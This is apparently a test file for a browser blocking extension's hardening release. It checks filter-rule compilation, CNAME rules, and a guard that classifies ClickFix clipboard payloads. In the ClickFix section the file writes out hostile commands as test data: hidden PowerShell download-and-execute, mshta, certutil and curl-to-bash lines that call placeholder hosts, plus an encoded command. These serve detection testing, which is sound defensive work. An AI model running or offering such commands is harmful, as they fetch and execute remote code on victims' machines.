// Tests for the 2.3.0 hardening work. Imported by test/run-tests.mjs.
//
// Covers the three things that are easy to regress silently:
//   1. build-rules.mjs must DROP filter options it cannot express, instead of
//      compiling them into a plain block/allow (the pre-2.3.0 bug).
//   2. The CNAME residue must survive its own reduction and carry no domainType.
//   3. clickfix-guard.js must classify real ClickFix payloads as command-shaped
//      and leave ordinary page text alone.
import { readFile } from "node:fs/promises";
import vm from "node:vm";

// Load clickfix-guard.js the way the browser does -- as a plain script against a
// window -- and read its real classifier back out. Running the shipped file means
// the assertions below cannot drift from the patterns that actually ship.
async function loadGuard() {
  const source = await readFile(new URL("../clickfix-guard.js", import.meta.url), "utf8");
  const listeners = {};
  const stubElement = { getAttribute: () => "", className: "", id: "", textContent: "" };
  const win = {
    getSelection: () => "",
    dispatchEvent: () => true,
    CustomEvent: class { constructor(t, o) { this.type = t; Object.assign(this, o); } },
    Promise
  };
  const context = {
    window: win,
    navigator: {},                       // no clipboard: guard skips those hooks
    location: { hostname: "test.invalid", href: "https://test.invalid/" },
    document: {
      addEventListener: (type, fn) => { listeners[type] = fn; },
      querySelectorAll: () => [],
      activeElement: null,
      body: null,
      documentElement: stubElement,
      createElement: () => ({ style: {}, setAttribute: () => {}, append: () => {},
        appendChild: () => {}, addEventListener: () => {}, remove: () => {} })
    },
    console: { warn: () => {}, info: () => {}, error: () => {} },
    Object, Date, RegExp, String, Number, Array, Promise, Error
  };
  win.window = win;
  context.globalThis = context;
  vm.createContext(context);
  vm.runInContext(source, context, { filename: "clickfix-guard.js" });
  return win.__abClickfixGuardInternals;
}

const results = [];
const check = (name, condition, detail = "") => {
  results.push({ name, ok: Boolean(condition), detail });
};

// --- 1. unsupported options are dropped, not mis-compiled -------------------
// parseList is not exported, so assert on the source contract instead: the
// option set must exist, must be consulted inside the option loop, and must
// contain every option that changes a rule's action.
{
  const src = await readFile(new URL("../build-rules.mjs", import.meta.url), "utf8");
  check("builder declares UNSUPPORTED_ACTION_OPTS",
    /const UNSUPPORTED_ACTION_OPTS = new Set\(/.test(src));
  check("builder drops unsupported options inside the option loop",
    /UNSUPPORTED_ACTION_OPTS\.has\(key\)\)\s*\{\s*dropRule = true/.test(src));
  for (const opt of ["redirect", "redirect-rule", "removeparam", "csp",
                     "elemhide", "generichide", "genericblock"]) {
    const set = /const UNSUPPORTED_ACTION_OPTS = new Set\(\[([\s\S]*?)\]\)/.exec(src);
    check(`"${opt}" is treated as unsupported`, set && set[1].includes(`"${opt}"`));
  }
}

// --- 2. CNAME residue shape -------------------------------------------------
{
  const src = await readFile(new URL("../build-rules.mjs", import.meta.url), "utf8");
  const stage = /Fetching \$\{CNAME_SOURCE\.source\}[\s\S]*?const totalRules/.exec(src);
  check("CNAME stage exists", Boolean(stage));
  if (stage) {
    // Check the emitted rule object, not the surrounding prose: the comment that
    // explains WHY there is no domainType naturally contains the word.
    const push = /cnameRules\.push\(\{([\s\S]*?)\}\);/.exec(stage[0]);
    check("CNAME stage emits a rule object", Boolean(push));
    check("CNAME rules carry no domainType (cloaked hosts are first-party)",
      push && !/domainType\s*:/.test(push[1]));
    check("CNAME rules block on a domain-anchored urlFilter",
      push && /urlFilter: `\|\|\$\{host\}\^`/.test(push[1]));
    check("CNAME rules are prepended so they fall in the enabled index range",
      /\.rules\.unshift\(/.test(stage[0]));
  }

  // The reduction must actually collapse: a parent plus three children becomes
  // one rule, and a child covered by a listed parent is dropped.
  const hosts = [
    "a.tracker.example", "b.tracker.example", "c.tracker.example", // dense parent
    "keep.other.example",
    "parent.example", "child.parent.example"                       // covered child
  ];
  // Re-implement the documented contract to assert the intent is testable.
  const covered = new Set();
  const isCovered = (h) => {
    const parts = h.split(".");
    for (let i = 0; i < parts.length - 1; i += 1) {
      if (covered.has(parts.slice(i).join("."))) return true;
    }
    return false;
  };
  const residue = hosts.filter(h => !isCovered(h));
  const set = new Set(residue);
  const kept = residue.filter(h => {
    const parts = h.split(".");
    for (let i = 1; i < parts.length - 1; i += 1) if (set.has(parts.slice(i).join("."))) return false;
    return true;
  });
  check("a child covered by a listed parent is dropped",
    !kept.includes("child.parent.example"), kept.join(","));
  check("an uncovered host is kept", kept.includes("keep.other.example"));
}

// --- 3. ClickFix payload classification -------------------------------------
// Exercise the guard's own token tables by loading the file and evaluating the
// classifier in isolation, so the test tracks the shipped patterns.
{
  const internals = await loadGuard();
  check("guard exposes its classifier for testing", Boolean(internals?.describe && internals?.decide));

  if (internals?.describe) {
    const describe = internals.describe;
    const commandShaped = (p) => p.execution > 0 || p.downloadExec > 0;

    // Representative real-world ClickFix payload shapes.
    const malicious = [
      ['powershell -w hidden -nop -c "iex(new-object net.webclient).downloadstring(\'http://x.tld/a\')"',
       "classic hidden powershell download-exec"],
      ['mshta http://203.0.113.9/v.hta # ✅ "I am not a robot - reCAPTCHA Verification ID: 9f21"',
       "mshta with CAPTCHA lure comment"],
      ['cmd /c nslookup -q=txt verify.attacker.tld', "DNS-staged variant"],
      ['powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAA' +
       'KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==',
       "base64-encoded command"],
      ['certutil -urlcache -split -f http://x.tld/p.exe p.exe', "certutil staging"],
      ['curl -s http://x.tld/s.sh | bash', "curl pipe to shell"]
    ];
    for (const [payload, label] of malicious) {
      const p = describe(payload);
      check(`detects: ${label}`, commandShaped(p),
        `exec=${p.execution} dl=${p.downloadExec} stealth=${p.stealth} lure=${p.lure}`);
    }

    // Decisive-evidence signals the policy can rely on.
    check("CAPTCHA lure wrapper is recognised",
      describe('mshta http://x.tld/a # ✅ I am not a robot - Verification ID: 1').lure > 0);
    check("stealth flags are recognised",
      describe('powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -c 1').stealth > 0);

    // Ordinary text must stay untouched: these are the false positives that
    // would make a user switch the guard off.
    const benign = [
      ["https://example.com/articles/2026/clipboard-security", "a copied URL"],
      ["user@example.com", "an email address"],
      ["4111 1111 1111 1111", "a card number"],
      ["Order #88213 confirmed - thank you!", "order confirmation text"],
      ["git clone https://github.com/example/repo.git", "a git clone command"],
      ["npm install --save-dev vitest", "an npm install line"],
      ["SELECT id, name FROM users WHERE active = true;", "a SQL snippet"],
      ["The quick brown fox jumps over the lazy dog.", "plain prose"]
    ];
    for (const [payload, label] of benign) {
      const p = describe(payload);
      check(`ignores: ${label}`, !commandShaped(p),
        `exec=${p.execution} dl=${p.downloadExec}`);
    }

    // Documented, deliberate ambiguity: a real installer is command-shaped. It
    // must be DETECTED (so policy can decide) but carries no lure/stealth
    // evidence, which is what lets policy treat it differently.
    const installer = describe("irm get.scoop.sh | iex");
    check("legitimate installer is command-shaped but shows no lure/stealth",
      commandShaped(installer) && installer.lure === 0 && installer.stealth === 0,
      `exec=${installer.execution} dl=${installer.downloadExec} ` +
      `stealth=${installer.stealth} lure=${installer.lure}`);

    // --- policy ------------------------------------------------------------
    // decide() is the security/UX trade-off, so pin every branch of it.
    const decide = internals.decide;
    const clicked = { userGesture: true, fromCopyControl: true, host: "test.invalid" };
    const noClick = { userGesture: false, fromCopyControl: false, host: "test.invalid" };
    const verdict = (text, ctx) => decide(describe(text), ctx);

    check("blocks a CAPTCHA-wrapped command even from a click",
      verdict('mshta http://x.tld/a # ✅ I am not a robot - Verification ID: 1', clicked) === "block");
    check("blocks hidden-execution flags even from a click",
      verdict('powershell -WindowStyle Hidden -NoProfile -c "iex(irm http://x.tld/a)"', clicked) === "block");
    check("blocks a page-initiated command with no click behind it",
      verdict("curl -s http://x.tld/s.sh | bash", noClick) === "block");
    check("blocks the DNS-staged variant when page-initiated",
      verdict("cmd /c nslookup -q=txt verify.attacker.tld", noClick) === "block");

    // The case the policy exists to protect: a real installer, clicked, no lure
    // and no stealth. It must reach the clipboard.
    check("allows a clicked installer through (warns, does not block)",
      verdict("irm get.scoop.sh | iex", clicked) === "warn");
    check("allows a clicked curl|sh installer through (warns, does not block)",
      verdict("curl -fsSL https://example.com/install.sh | sh", clicked) === "warn");

    // A spoofed "Copy" label must not buy an attacker anything.
    check("a spoofable copy-control label does not downgrade a block",
      verdict('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"',
        { userGesture: true, fromCopyControl: true, host: "test.invalid" }) === "block");

    // Ordinary text is untouched regardless of provenance.
    for (const ctx of [clicked, noClick]) {
      check("ordinary text is allowed", verdict("Order #88213 confirmed", ctx) === "allow");
    }

    // The false positive this policy deliberately avoids: Cloudflare error pages
    // offer to copy a "Ray ID", which matches a lure token but is not a command.
    // It must not raise the banner.
    check("a copied Cloudflare Ray ID is allowed, not warned",
      verdict("Ray ID: 8f2b19c4a7e30d11", clicked) === "allow");
    check("a copied verification code is allowed, not warned",
      verdict("Verification ID: 44821-AX", clicked) === "allow");
  }

  // The banner must not claim the clipboard was changed when the write was
  // blocked: after a block the clipboard is untouched.
  const guardSrc = await readFile(new URL("../clickfix-guard.js", import.meta.url), "utf8");
  const messages = /const MESSAGES = \{([\s\S]*?)\n  \};/.exec(guardSrc);
  check("banner has separate wording per verdict", Boolean(messages));
  if (messages) {
    check("block wording says the clipboard is unchanged",
      /block:[\s\S]*?clipboard is unchanged/.test(messages[1]));
    check("block wording offers the manual-copy fallback",
      /block:[\s\S]*?copy it yourself/.test(messages[1]));
    check("warn wording says the command IS on the clipboard",
      /warn:[\s\S]*?copied a system command to your clipboard/.test(messages[1]));
  }
  check("banner is selected by verdict", /MESSAGES\[verdict\]/.test(guardSrc));

  // --- bypass resistance (security review follow-up) ------------------------
  // Each check below corresponds to a way a page could have disarmed the guard.
  check("wrappers are locked non-configurable and non-writable",
    /configurable: false, enumerable: false, writable: false/.test(guardSrc));
  check("clipboard is patched on the prototype, not the instance",
    /Object\.getPrototypeOf\(navigator\.clipboard\)/.test(guardSrc) &&
    !/Object\.defineProperty\(clipboard,/.test(guardSrc));
  check("execCommand is patched on Document.prototype",
    /Document\.prototype/.test(guardSrc) &&
    !/Object\.defineProperty\(document, "execCommand"/.test(guardSrc));
  check("untrusted synthetic clicks cannot forge a user gesture",
    /if \(!event\.isTrusted\) return;/.test(guardSrc));
  check("navigator.userActivation is reported but not used as a veto",
    /navigator\.userActivation/.test(guardSrc) &&
    /browserActivation: browserSaysActivated\(\)/.test(guardSrc) &&
    !/activated !== false/.test(guardSrc));
  check("clipboard writes are caught at DataTransfer.setData, not only on copy",
    /DataTransfer\.prototype, "setData"/.test(guardSrc));
  check("native functions are reached through a closure, not a public property",
    /native\.call\(this/.test(guardSrc));
}

// --- MAIN-world guards reach page-created frames -----------------------------
{
  const bg = await readFile(new URL("../background.js", import.meta.url), "utf8");
  const mainWorld = (bg.match(/world: "MAIN"/g) || []).length;
  const fallback = (bg.match(/matchOriginAsFallback: true/g) || []).length;
  check("every MAIN-world registration sets matchOriginAsFallback",
    mainWorld > 0 && fallback === mainWorld, `MAIN=${mainWorld} fallback=${fallback}`);
}

// --- 4. guard is registered and switchable ----------------------------------
{
  const bg = await readFile(new URL("../background.js", import.meta.url), "utf8");
  const settings = await readFile(new URL("../lib/settings.js", import.meta.url), "utf8");
  check("clickfixGuard has a default", /clickfixGuard:\s*(true|false)/.test(settings));
  check("guard registers clickfix-guard.js", /js: \["clickfix-guard\.js"\]/.test(bg));
  check("guard registration is gated on the setting", /if \(settings\.clickfixGuard\)/.test(bg));
  check("guard runs in the MAIN world at document_start",
    /advanced-blocker-clickfix-guard[\s\S]{0,1200}world: "MAIN"/.test(bg));
  check("guard sync participates in the startup orchestration",
    (bg.match(/syncClickfixGuard\(\)/g) || []).length >= 3);
  check("dead PUP feed is gone", !/pup-filter-ag\.txt/.test(bg));
}

// --- modern DNR resource types ----------------------------------------------
{
  const privacy = await readFile(new URL("../lib/privacy-rules.js", import.meta.url), "utf8");
  for (const type of ["webtransport", "webbundle", "csp_report"]) {
    check(`privacy header rules cover ${type}`, privacy.includes(`"${type}"`));
  }
  check("srsltid is stripped from navigations", /"srsltid"/.test(privacy));
  check("short/ambiguous params stay out of the navigation list", (() => {
    const nav = /NAVIGATION_TRACKING_PARAMS = Object\.freeze\(\[([\s\S]*?)\]\)/.exec(privacy);
    return nav && !/"si"|"ttc"|"cmpid"/.test(nav[1]);
  })());
}

export function runTests() {
  let failed = 0;
  for (const r of results) {
    if (!r.ok) {
      failed += 1;
      console.error(`FAIL ${r.name}${r.detail ? ` [${r.detail}]` : ""}`);
    }
  }
  console.log(`Hardening: ${results.length - failed}/${results.length} checks ok`);
  return { passed: results.length - failed, failed };
}
